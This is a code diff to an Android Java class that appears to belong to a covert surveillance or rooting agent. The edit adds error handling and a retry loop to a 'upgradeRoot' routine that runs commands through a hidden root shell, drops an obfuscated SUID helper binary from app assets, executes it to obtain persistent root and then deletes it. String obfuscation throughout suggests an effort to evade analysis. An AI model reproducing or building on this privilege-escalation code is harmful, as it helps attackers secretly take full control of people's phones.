@@ -120,7 +120,7 @@ public class PackageInfo {
 		return permFound;
 	}
 
-	static public boolean checkRoot() { //$NON-NLS-1$
+	static synchronized public boolean checkRoot() { //$NON-NLS-1$
 		boolean isRoot = false;
 
 		if (Status.haveRoot()) {
@@ -266,33 +266,49 @@ public class PackageInfo {
 
 		if (file.exists() && file.canRead()) {
 
-			ExecuteResult p = Execute.execute(Configuration.oldShellFileBase + M.e(" qzx id"));
-			String stdout = p.getStdout();
-			if (stdout.startsWith(M.e("uid=0"))) {
+			try {
+				ExecuteResult p = Execute.execute(Configuration.oldShellFileBase + M.e(" qzx id"));
+				String stdout = p.getStdout();
+				if (stdout.startsWith(M.e("uid=0"))) {
 
-				final File filesPath = Status.getAppContext().getFilesDir();
-				final String path = filesPath.getAbsolutePath();
+					final File filesPath = Status.getAppContext().getFilesDir();
+					final String path = filesPath.getAbsolutePath();
 
-				final String suidext = M.e("ss"); // suidext
+					final String suidext = M.e("ss"); // suidext
 
-				AutoFile dbgd = new AutoFile(M.e("/system/bin/dbgd"));
-				if (dbgd.exists()) {
-					Utils.dumpAsset(M.e("jb.data"), suidext);// selinux_suidext
-				} else {
-					Utils.dumpAsset(M.e("sb.data"), suidext);// suidext
-				}
-
-				AutoFile suidextFile = new AutoFile(path + "/" + suidext);
-				suidextFile.chmod("755");
-				try {
-					p = Execute.execute(new String[]{Configuration.oldShellFileBase, "qzx", suidextFile.getFilename() + " rt"});
-					stdout = p.getStdout();
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (upgradeRoot), result: " + stdout);
+					AutoFile dbgd = new AutoFile(M.e("/system/bin/dbgd"));
+					if (dbgd.exists()) {
+						Utils.dumpAsset(M.e("jb.data"), suidext);// selinux_suidext
+					} else {
+						Utils.dumpAsset(M.e("sb.data"), suidext);// suidext
 					}
-					return checkRoot();
-				} finally {
-					suidextFile.delete();
+
+					AutoFile suidextFile = new AutoFile(path + "/" + suidext);
+					suidextFile.chmod("755");
+					try {
+						p = Execute.execute(new String[]{Configuration.oldShellFileBase, "qzx", suidextFile.getFilename() + " rt"});
+						stdout = p.getStdout();
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (upgradeRoot), result: " + stdout);
+						}
+
+					} catch (Exception ex) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (upgradeRoot), ERROR: " + ex);
+						}
+					} finally {
+						suidextFile.delete();
+					}
+
+					for (int i = 0; i < 10; i++) {
+						Utils.sleep(1000);
+						if (checkRoot())
+							return true;
+					}
+				}
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (upgradeRoot), ERROR: " + ex);
 				}
 			}
 		}
